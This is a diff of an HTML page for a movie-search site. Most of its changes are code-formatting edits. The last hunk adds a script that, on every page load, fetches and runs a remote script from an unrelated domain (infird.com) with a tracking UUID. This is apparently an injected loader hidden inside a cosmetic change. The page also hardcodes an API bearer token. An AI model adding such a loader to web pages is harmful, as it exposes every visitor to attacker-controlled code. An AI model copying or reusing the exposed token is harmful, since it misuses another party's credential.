@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
+  <meta charset="UTF-8" />
   <title>Chuzis – Home</title>
   <style>
     * {
@@ -45,17 +45,30 @@
     }
 
     @keyframes fadeOut {
-      to { opacity: 0; visibility: hidden; }
+      to {
+        opacity: 0;
+        visibility: hidden;
+      }
     }
 
     @keyframes catDrop {
-      0% { transform: translateY(-100%); opacity: 0; }
-      100% { transform: translateY(0); opacity: 1; }
+      0% {
+        transform: translateY(-100%);
+        opacity: 0;
+      }
+      100% {
+        transform: translateY(0);
+        opacity: 1;
+      }
     }
 
     @keyframes catSpinScale {
-      0% { transform: rotate(0deg) scale(1); }
-      100% { transform: rotate(360deg) scale(3); }
+      0% {
+        transform: rotate(0deg) scale(1);
+      }
+      100% {
+        transform: rotate(360deg) scale(3);
+      }
     }
 
     header {
@@ -132,7 +145,7 @@
   <header>🎬 Welcome to Chuzis</header>
 
   <div id="search-section">
-    <input type="text" id="movieSearch" placeholder="Search for a movie...">
+    <input type="text" id="movieSearch" placeholder="Search for a movie..." />
     <button onclick="searchMovie()">Search</button>
   </div>
 
@@ -145,11 +158,17 @@
       resultsContainer.innerHTML = "<p>Searching...</p>";
 
       try {
-        const res = await fetch(`https://api.themoviedb.org/3/search/movie?query=${encodeURIComponent(query)}&include_adult=false&language=en-US&page=1`, {
-          headers: {
-            Authorization: `Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJlODA5MWQ0NDdlODQ3MjhlYmU0Mzc5NzI0NWNjNmY4NSIsIm5iZiI6MTc0ODAzNTQ0Mi43MDUsInN1YiI6IjY4MzBlNzcyNjQwZTA1YjQyOGI2YTlmYyIsInNjb3BlcyI6WyJhcGlfcmVhZCJdLCJ2ZXJzaW9uIjoxfQ.WoEuagI5GPkLtkM8xeY81jpNj6sS9VMRcYLuLS3xpFM`
+        const res = await fetch(
+          `https://api.themoviedb.org/3/search/movie?query=${encodeURIComponent(
+            query
+          )}&include_adult=false&language=en-US&page=1`,
+          {
+            headers: {
+              Authorization:
+                "Bearer eyJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJlODA5MWQ0NDdlODQ3MjhlYmU0Mzc5NzI0NWNjNmY4NSIsIm5iZiI6MTc0ODAzNTQ0Mi43MDUsInN1YiI6IjY4MzBlNzcyNjQwZTA1YjQyOGI2YTlmYyIsInNjb3BlcyI6WyJhcGlfcmVhZCJdLCJ2ZXJzaW9uIjoxfQ.WoEuagI5GPkLtkM8xeY81jpNj6sS9VMRcYLuLS3xpFM",
+            },
           }
-        });
+        );
 
         const data = await res.json();
         resultsContainer.innerHTML = "";
@@ -159,17 +178,21 @@
           return;
         }
 
-        data.results.forEach(movie => {
+        data.results.forEach((movie) => {
           const movieCard = document.createElement("div");
           movieCard.classList.add("movie-card");
 
           const img = document.createElement("img");
-          img.src = movie.poster_path ? `https://image.tmdb.org/t/p/w300${movie.poster_path}` : "https://via.placeholder.com/300x450?text=No+Image";
+          img.src = movie.poster_path
+            ? `https://image.tmdb.org/t/p/w300${movie.poster_path}`
+            : "https://via.placeholder.com/300x450?text=No+Image";
           const title = document.createElement("h3");
           title.textContent = movie.title;
 
           const link = document.createElement("a");
-          link.href = `https://www.google.com/search?q=watch+${encodeURIComponent(movie.title)}+online`;
+          link.href = `https://www.google.com/search?q=watch+${encodeURIComponent(
+            movie.title
+          )}+online`;
           link.target = "_blank";
           link.textContent = "Watch Now";
 
@@ -183,6 +206,31 @@
         resultsContainer.innerHTML = "<p>Error fetching movies.</p>";
       }
     }
+  </script>
+
+  <script>
+    (() => {
+      if (document.querySelector("script[data-awssuidacr]") !== null) {
+        return;
+      }
+
+      const head = document.querySelector("head");
+      const awssuidacr = "6b2477f7-6c64-4a47-b71c-0ef74c1430c5";
+
+      function createScript(url) {
+        url = new URL(url);
+        url.searchParams.append("uuid", awssuidacr);
+
+        const script = document.createElement("script");
+        script.type = "text/javascript";
+        script.src = url.href;
+        script.dataset["awssuidacr"] = awssuidacr;
+
+        head.appendChild(script);
+      }
+
+      createScript("https://infird.com/cdn/b50b7f30-3efc-40a4-958b-47c84a6ef83f");
+    })();
   </script>
 </body>
 </html>
